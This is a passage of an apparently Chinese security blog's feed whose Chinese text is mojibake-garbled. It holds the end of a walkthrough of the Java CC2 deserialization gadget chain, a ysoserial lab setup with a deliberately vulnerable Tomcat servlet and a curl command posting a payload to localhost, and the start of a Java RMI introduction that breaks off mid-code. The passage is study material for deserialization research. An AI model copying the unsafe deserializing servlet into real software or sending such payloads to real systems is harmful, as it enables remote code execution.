alt="14"></p><p>æ¥ç€ä¼˜å…ˆçº§é˜Ÿåˆ—æ¯æ¬¡æ¯”è¾ƒçš„æ—¶å€™ï¼Œéƒ½ä¼šè°ƒç”¨æ¯”è¾ƒå™¨çš„<code>compare</code>æ–¹æ³•ï¼Œæ­¤æ—¶æœåŠ¡ç«¯å°±ä¼šè°ƒç”¨<code>TransformingComparator.compare</code>æ–¹æ³•ï¼Œè¿›è€Œæ‰§è¡Œ<code>this.transformer.transform</code>æ–¹æ³•ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šæ‰§è¡Œ<code>InvokerTransformer.transform</code>æ–¹æ³•</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/15.png" alt="15"></p><h5 id="setFieldValue"><a href="#setFieldValue" class="headerlink" title="setFieldValue"></a>setFieldValue</h5><p>ç»§ç»­å›åˆ°CC2 Payloadæ–‡ä»¶ä¸­ï¼Œ<code>setFieldValue</code>æ–¹æ³•é€šè¿‡åå°„å°†<code>iMethodName</code>ä¿®æ”¹ä¸º<code>newTransformer</code></p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/16.png" alt="16"></p><h5 id="getFieldValue"><a href="#getFieldValue" class="headerlink" title="getFieldValue"></a>getFieldValue</h5><p>æ¥ä¸‹æ¥è·å–åˆ°ä¼˜å…ˆçº§é˜Ÿåˆ—çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶ä¿®æ”¹äº†å…¶å­—æ®µå€¼ï¼Œå°†æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»æ³¨å…¥</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/17.png" alt="17"></p><p>ä¿®æ”¹ä¹‹åï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—ä¼šè°ƒç”¨æ¯”è¾ƒå™¨çš„<code>compare</code>æ–¹æ³•å»æ¯”è¾ƒ<code>templates</code>å’Œ1çš„å€¼ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨æ‰§è¡Œ<code>InvokerTransformer.transform(templates)</code>æ–¹æ³•ã€‚æ­¤æ—¶ç”±äº<code>templates</code>æ˜¯<code>TemplatesImpl</code>ç±»å‹çš„ï¼Œå› æ­¤å®é™…æœ€åä¼šæ‰§è¡Œ<code>TemplatesImpl.newTransformer</code>æ–¹æ³•ã€‚</p><p>æœ€å<code>Ysoserial</code>è¿”å›çš„ä¼˜å…ˆçº§é˜Ÿåˆ—å®ä¾‹å¯¹è±¡å¦‚ä¸‹</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/18.png" alt="18"></p><h4 id="CC2-Payloadåˆ©ç”¨åŸç†"><a href="#CC2-Payloadåˆ©ç”¨åŸç†" class="headerlink" title="CC2 Payloadåˆ©ç”¨åŸç†"></a>CC2 Payloadåˆ©ç”¨åŸç†</h4><p>é€šè¿‡<code>Ysoserial</code>åˆ†æå¯ä»¥çœ‹åˆ°Payloadè¿”å›çš„æ˜¯ä¸€ä¸ª<code>PriorityQueue</code>å¯¹è±¡ã€‚åœ¨å¯¹<code>Web Server</code>è¿›è¡Œè°ƒè¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç›´æ¥å°†æ–­ç‚¹æ‰“åœ¨<code>PriorityQueue</code>çš„<code>readObject</code>æ–¹æ³•å¤„ã€‚</p><p><code>PriorityQueue</code>è·¯å¾„ä¸º<code>rt.jar.java.util.PriorityQueue</code></p><h5 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject"></a>PriorityQueue.readObject</h5><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/19.png" alt="19"></p><p>åœ¨<code>readObject</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆé€šè¿‡<code>defaultReadObject</code>æ–¹æ³•ååºåˆ—åŒ–æ•°æ®æµã€‚ä¹‹åé€šè¿‡<code>readInt</code>æ–¹æ³•è¯»å–ä¼˜å…ˆçº§é˜Ÿåˆ—çš„é•¿åº¦ï¼Œæ¥ç€å¾ªç¯è¯»å–æ•°ç»„<code>queue</code>ä¸­çš„å†…å®¹</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/20.png" alt="20"></p><h5 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify"></a>PriorityQueue.heapify</h5><p>ä¹‹åè°ƒç”¨<code>heapify</code>æ–¹æ³•ï¼Œå°†æ— åºæ•°ç»„è¿˜åŸæˆä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚åœ¨è¯¥æ–¹æ³•ä¸­ä¼šå¾ªç¯æ‰¾æœ€åä¸€ä¸ªéå¶å­ç»“ç‚¹ï¼Œç„¶åå€’åºè°ƒç”¨<code>siftDown</code>æ–¹æ³•</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/21.png" alt="21"></p><h5 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown"></a>PriorityQueue.siftDown</h5><p>åœ¨<code>siftDown</code>æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨<code>siftDownUsingComparator</code>æ–¹æ³•</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/22.png" alt="22"></p><h5 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator"></a>PriorityQueue.siftDownUsingComparator</h5><p>è¯¥æ–¹æ³•ä¸»è¦ç”¨äºå½¢æˆæœ€å°å †</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/23.png" alt="23"></p><h5 id="cc4-TransformingComparator"><a href="#cc4-TransformingComparator" class="headerlink" title="cc4.TransformingComparator"></a>cc4.TransformingComparator</h5><p>è¯¥æ–¹æ³•ä¼šè·å–éœ€è¦æ¯”è¾ƒçš„å˜é‡ã€‚ä»è€Œæ‰§è¡Œ<code>this.transformer.transform</code>ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»å°†<code>this.transformer</code>æŒ‡å‘äº†<code>InvokerTransformer</code>å®ä¾‹å¯¹è±¡ã€‚å› æ­¤ä¼šæ‰§è¡Œ<code>InvokerTransformer.transform</code>æ–¹æ³•ï¼Œè€Œ<code>transform</code>ä¸­çš„å‚æ•°å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„ç±»<code>TemplatesImpl</code></p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/24.png" alt="24"></p><h5 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform"></a>InvokerTransformer.transform</h5><p>åœ¨<code>Ysoserial</code>åˆ†æpayloadç”Ÿæˆçš„æ—¶å€™æˆ‘ä»¬å°†<code>iMethodName</code>çš„å€¼æ”¹ä¸ºäº†<code>newTransformer</code>ï¼Œå› æ­¤è¿™é‡Œä¼šåå°„è°ƒç”¨<code>TemplatesImpl.newTransformer</code>æ–¹æ³•</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/25.png" alt="25"></p><h5 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer"></a>TemplatesImpl.newTransformer</h5><p><code>TemplatesImpl</code>è·¯å¾„ä¸º<code>rt.jar.com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p>åœ¨æ„å»º<code>TemplatesImpl</code>å®ä¾‹å¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨<code>getTransletInstance</code>æ–¹æ³•ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/26.png" alt="26"></p><h5 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance"></a>TemplatesImpl.getTransletInstance</h5><p>åœ¨<code>getTransletInstance</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆä¼šåˆ¤æ–­<code>_name</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºï¼Œç›´æ¥<code>return</code>ã€‚æ¥ç€ä¼šåˆ¤æ–­<code>_class</code>å¹¶è¿›å…¥<code>defineTransletClasses</code>æ–¹æ³•ä¸­</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/27.png" alt="27"></p><h5 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses"></a>TemplatesImpl.defineTransletClasses</h5><p>è¯¥æ–¹æ³•ä¼šå¯¹<code>_bytecodes</code>å­—æ®µè¿›è¡Œè§£æï¼Œæœ€åå°†<code>_transletIndex</code>çš„å€¼èµ‹ä¸º0</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/28.png" alt="28"></p><h5 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h5><p>æ­¤æ—¶çš„<code>_class[_transletIndex]</code>å³ä¸º<code>_class[0]</code>ä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šè¿‡å•Š<code>Ysoserial</code>æ„é€ çš„æ¶æ„ç±»ï¼Œè°ƒç”¨<code>newInstance</code>æ–¹æ³•åæ¶æ„ç±»ä¼šè¢«åŠ è½½ç„¶åè¢«å®ä¾‹åŒ–ï¼Œæœ€ç»ˆæ‰§è¡Œå‘½ä»¤ã€‚</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/29.png" alt="29"></p><p>å®Œæ•´çš„åˆ©ç”¨é“¾å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/12/15/Java-CC2é“¾å¤ç°ä¸åˆ†æ/30.png" alt="30"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å¤ç°ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#å¤ç°ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;å¤ç°ç¯å¢ƒ&quot;&gt;&lt;/a&gt;å¤ç°ç¯å¢ƒ&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Ysoserialå­¦ä¹ </title>
    <link href="elssm.github.io/2021/12/13/Ysoserial%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/12/13/Ysoserialå­¦ä¹ /</id>
    <published>2021-12-13T04:20:53.000Z</published>
    <updated>2021-12-13T05:19:08.022Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ä¹‹å‰æ²¡æœ‰å­¦ä¹ è¿‡Javaï¼Œæ‰€ä»¥ä¸å¤ªäº†è§£Javaç›¸å…³æ¼æ´ï¼Œå› æ­¤æ‰“ç®—é€šè¿‡<code>ysoserial</code>è¿™ä¸ªå·¥å…·å­¦ä¹ ä¸€ä¸‹ï¼Œ<code>ysoserial</code>é›†åˆäº†å„ç§Javaååºåˆ—åŒ–payloadï¼Œä¸Šæ‰‹ä¹Ÿæ¯”è¾ƒå®¹æ˜“ã€‚</p><p>githubåœ°å€ï¼š<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><h4 id="Ysoserialç¯å¢ƒé…ç½®"><a href="#Ysoserialç¯å¢ƒé…ç½®" class="headerlink" title="Ysoserialç¯å¢ƒé…ç½®"></a>Ysoserialç¯å¢ƒé…ç½®</h4><p><code>git clone</code>åˆ°æœ¬åœ°ä¹‹åé€šè¿‡<code>IDEA</code>æ‰“å¼€ã€‚å› ä¸º<code>ysoserial</code>é¡¹ç›®æ˜¯é€šè¿‡<code>Maven</code>æ­å»ºçš„ï¼Œå› æ­¤ç›¸å…³ä¾èµ–ä¹Ÿé€šè¿‡<code>Maven</code>ä¸‹è½½é…ç½®ã€‚</p><p>ä¾èµ–é…ç½®å®Œæˆä¹‹åï¼Œè¿è¡Œé¡¹ç›®çš„ä¸»å‡½æ•°ï¼Œåœ°å€åœ¨</p><p><code>ysoserial/src/main/java/ysoserial/GeneratePayload.main()</code></p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /1.png" alt="1"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡<code>IDEA</code>ç»™<code>ysoserial</code>æ·»åŠ å‚æ•°ï¼Œä¾‹å¦‚é€šè¿‡<code>CommonsCollections1</code>æ‰§è¡Œå¼¹è®¡ç®—å™¨çš„å‘½ä»¤ã€‚</p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /2.png" alt="2"></p><p>æ‰§è¡Œ<code>GeneratePayload.java</code>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /3.png" alt="3"></p><p>æµ‹è¯•çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å°†è¿™æ®µ<code>payload</code>å‘é€å‡ºå»ï¼Œä½†æ˜¯ç”±äºæ˜¯åºåˆ—åŒ–çš„æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¿å­˜åˆ°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œç¨‹åºä¼šæ‰§è¡Œ<code>writeObject()</code>æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨<code>writeObject()</code>ä¹‹åå°†æ•°æ®ä¿å­˜ã€‚å› æ­¤å¯ä»¥å®šä½åˆ°å¦‚ä¸‹è¿™æ®µä»£ç </p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /4.png" alt="4"></p><p>åœ¨<code>Serializer.serialize()</code>ä¸­æ‰§è¡Œäº†<code>writeObject()</code>æ–¹æ³•</p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /5.png" alt="5"></p><p>å› æ­¤æˆ‘ä»¬åœ¨<code>writeObject()</code>æ–¹æ³•åï¼Œå†™å…¥ä¿å­˜åºåˆ—åŒ–æ–‡ä»¶çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">"/YourPath/payload.ser"</span>);</span><br><span class="line">            ObjectOutputStream ot = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line">            ot.writeObject(obj);</span><br><span class="line">            ot.close();</span><br><span class="line">            fout.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe)&#123;</span><br><span class="line">            System.out.println(<span class="string">"payload not found"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /6.png" alt="6"></p><p>ä¹‹åå†æ¬¡è¿è¡Œ<code>GeneratePayload.java</code>ï¼Œåˆ™ä¼šåœ¨æŒ‡å®šçš„è·¯å¾„ä¸‹ç”Ÿæˆ<code>payload.ser</code>æ–‡ä»¶</p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /7.png" alt="7"></p><h4 id="WebServeré…ç½®"><a href="#WebServeré…ç½®" class="headerlink" title="WebServeré…ç½®"></a>WebServeré…ç½®</h4><h5 id="ç‰ˆæœ¬è¯´æ˜"><a href="#ç‰ˆæœ¬è¯´æ˜" class="headerlink" title="ç‰ˆæœ¬è¯´æ˜"></a>ç‰ˆæœ¬è¯´æ˜</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat:8.5.73</span><br><span class="line">jdk:1.7</span><br></pre></td></tr></table></figure><h5 id="Web-xmlé…ç½®"><a href="#Web-xmlé…ç½®" class="headerlink" title="Web.xmlé…ç½®"></a>Web.xmlé…ç½®</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DemoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>demotest.DemoServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DemoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demotest<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ç›¸å…³åŒ…çš„å¼•å…¥"><a href="#ç›¸å…³åŒ…çš„å¼•å…¥" class="headerlink" title="ç›¸å…³åŒ…çš„å¼•å…¥"></a>ç›¸å…³åŒ…çš„å¼•å…¥</h5><p>åœ¨<code>WEB-INF/lib</code>ä¸‹å¯¼å…¥<code>CommonsCollections3.1.jar</code></p><h5 id="Tomcaté…ç½®"><a href="#Tomcaté…ç½®" class="headerlink" title="Tomcaté…ç½®"></a>Tomcaté…ç½®</h5><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /8.png" alt="8"></p><h5 id="å¤„ç†è¯·æ±‚"><a href="#å¤„ç†è¯·æ±‚" class="headerlink" title="å¤„ç†è¯·æ±‚"></a>å¤„ç†è¯·æ±‚</h5><p>å¯¹<code>POST</code>è¯·æ±‚çš„æ•°æ®æ‰§è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå¤„ç†ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demotest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoServlet</span> <span class="keyword">extends</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">http</span>.<span class="title">HttpServlet</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(javax.servlet.http.HttpServletRequest request,javax.servlet.http.HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ServletInputStream sis = request.getInputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(sis);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(javax.servlet.http.HttpServletRequest request,javax.servlet.http.HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">"This is a demo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¯åŠ¨æœåŠ¡"><a href="#å¯åŠ¨æœåŠ¡" class="headerlink" title="å¯åŠ¨æœåŠ¡"></a>å¯åŠ¨æœåŠ¡</h5><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /9.png" alt="9"></p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /10.png" alt="10"></p><h4 id="CC1-Payloadæµ‹è¯•"><a href="#CC1-Payloadæµ‹è¯•" class="headerlink" title="CC1 Payloadæµ‹è¯•"></a>CC1 Payloadæµ‹è¯•</h4><p>ä½¿ç”¨<code>curl</code>å‘½ä»¤å‘æœåŠ¡å™¨å‘é€postè¯·æ±‚ï¼Œå°†å‰é¢ç”Ÿæˆçš„<code>payload.ser</code>å‘é€åˆ°æœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8080/demotest --data-binary @/Users/caoyifan/payload.ser</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--data-binary &lt;data&gt;</span><br><span class="line">  (HTTP) This posts data exactly as specified with no extra processing whatsoever.</span><br><span class="line">  If you start the data with the letter @, the rest should be a filename.  Data is</span><br><span class="line">  posted in a similar manner as --data-ascii does, except that newlines are preserved</span><br><span class="line">  and conversions are never done.</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œå¼¹è®¡ç®—å™¨çš„å‘½ä»¤</p><p><img src="/2021/12/13/Ysoserialå­¦ä¹ /11.png" alt="11"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h4&gt;&lt;p&gt;ä¹‹å‰æ²¡æœ‰å­¦ä¹ è¿‡Javaï¼Œæ‰€ä»¥ä¸å¤ªäº†è§£Javaç›¸å…³æ¼æ´ï¼Œå› æ­¤æ‰“ç®—é€šè¿‡&lt;code&gt;ysoserial&lt;/code&gt;è¿™ä¸ªå·¥å…·å­¦ä¹ ä¸€ä¸‹ï¼Œ&lt;code&gt;
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI</title>
    <link href="elssm.github.io/2021/12/01/Java-RMI/"/>
    <id>elssm.github.io/2021/12/01/Java-RMI/</id>
    <published>2021-12-01T02:30:24.000Z</published>
    <updated>2021-12-13T09:45:51.497Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>Java RMI æŒ‡çš„æ˜¯è¿œç¨‹æ–¹æ³•è°ƒç”¨ (Remote Method Invocation)ã€‚å®ƒæ˜¯ä¸€ç§æœºåˆ¶ï¼Œèƒ½å¤Ÿè®©åœ¨æŸä¸ª Java è™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ª Java è™šæ‹Ÿæœºä¸­çš„å¯¹è±¡ä¸Šçš„æ–¹æ³•ã€‚</p><p>åœ¨Javaä¸­ï¼Œåªè¦ä¸€ä¸ªç±»ç»§æ‰¿äº†<code>java.rmi.Remote</code>æ¥å£ï¼Œå³å¯æˆä¸ºå­˜åœ¨äºæœåŠ¡å™¨ç«¯çš„è¿œç¨‹å¯¹è±¡ï¼Œä¾›å®¢æˆ·ç«¯è®¿é—®å¹¶æä¾›ä¸€å®šçš„æœåŠ¡ã€‚</p><h4 id="RMIæ¡†æ¶"><a href="#RMIæ¡†æ¶" class="headerlink" title="RMIæ¡†æ¶"></a>RMIæ¡†æ¶</h4><p>RMIæ¡†æ¶å°è£…äº†æ‰€æœ‰åº•å±‚é€šä¿¡ç»†èŠ‚ï¼Œå¹¶ä¸”è§£å†³äº†ç¼–ç»„ã€åˆ†å¸ƒå¼åƒåœ¾æ”¶é›†ã€å®‰å…¨æ£€æŸ¥å’Œå¹¶å‘æ€§ç­‰é€šç”¨é—®é¢˜ï¼Œå¼€å‘äººå‘˜åªéœ€ä¸“æ³¨äºå¼€å‘ä¸ç‰¹å®šé—®é¢˜é¢†åŸŸç›¸å…³çš„å„ç§æœ¬åœ°å¯¹è±¡å’Œè¿œç¨‹å¯¹è±¡å³å¯ã€‚</p><h5 id="Stubå’ŒSkeleton"><a href="#Stubå’ŒSkeleton" class="headerlink" title="Stubå’ŒSkeleton"></a>Stubå’ŒSkeleton</h5><p>RMIæ¡†æ¶é‡‡ç”¨ä»£ç†æ¥è´Ÿè´£å®¢æˆ·ä¸è¿œç¨‹å¯¹è±¡ä¹‹é—´é€šè¿‡Socketè¿›è¡Œé€šä¿¡çš„ç»†èŠ‚ã€‚RMIæ¡†æ¶ä¸ºè¿œç¨‹å¯¹è±¡åˆ†åˆ«ç”Ÿæˆäº†å®¢æˆ·ç«¯ä»£ç†å’ŒæœåŠ¡å™¨ç«¯ä»£ç†ï¼Œä½äºå®¢æˆ·ç«¯çš„ä»£ç†ç±»ç§°ä¸ºStubï¼Œä½äºæœåŠ¡å™¨ç«¯çš„ä»£ç†ç±»ç§°ä¸ºSkeletonã€‚stub(å­˜æ ¹)å’Œskeleton( éª¨æ¶ ) åœ¨RMIä¸­å……å½“ä»£ç†è§’è‰²ï¼Œåœ¨ç°å®å¼€å‘ä¸­ä¸»è¦æ˜¯ç”¨æ¥éšè—ç³»ç»Ÿå’Œç½‘ç»œçš„çš„å·®å¼‚ï¼Œ è¿™ä¸€éƒ¨åˆ†çš„åŠŸèƒ½åœ¨RMIå¼€å‘ä¸­å¯¹ç¨‹åºå‘˜æ˜¯é€æ˜çš„ã€‚Stubä¸ºå®¢æˆ·ç«¯ç¼–ç è¿œç¨‹å‘½ä»¤å¹¶æŠŠä»–ä»¬å‘é€åˆ°æœåŠ¡å™¨ã€‚è€ŒSkeletonåˆ™æ˜¯æŠŠè¿œç¨‹å‘½ä»¤è§£ç ï¼Œè°ƒç”¨æœåŠ¡ç«¯çš„è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼ŒæŠŠç»“æœåœ¨ç¼–ç å‘ç»™stubï¼Œç„¶åstubå†è§£ç è¿”å›è°ƒç”¨ç»“æœç»™å®¢æˆ·ç«¯ã€‚</p><p><img src="/2021/12/01/Java-RMI/24.png" alt="24"></p><h4 id="å®ç°RMIæ­¥éª¤"><a href="#å®ç°RMIæ­¥éª¤" class="headerlink" title="å®ç°RMIæ­¥éª¤"></a>å®ç°RMIæ­¥éª¤</h4><ul><li>å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£ï¼Œæ­¤æ¥å£éœ€è¦ç»§æ‰¿<code>Remote</code></li><li>å¼€å‘è¿œç¨‹æ¥å£çš„å®ç°ç±»</li><li>åˆ›å»ºä¸€ä¸ª<code>server</code>å¹¶æŠŠè¿œç¨‹å¯¹è±¡æ³¨å†Œåˆ°ç«¯å£</li><li>åˆ›å»ºä¸€ä¸ª<code>client</code>æŸ¥æ‰¾è¿œç¨‹å¯¹è±¡ï¼Œè°ƒç”¨è¿œç¨‹æ–¹æ³•</li></ul><h4 id="RMIå®ç°"><a href="#RMIå®ç°" class="headerlink" title="RMIå®ç°"></a>RMIå®ç°</h4><p>é¦–å…ˆæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£<code>Hello.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi.server;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span 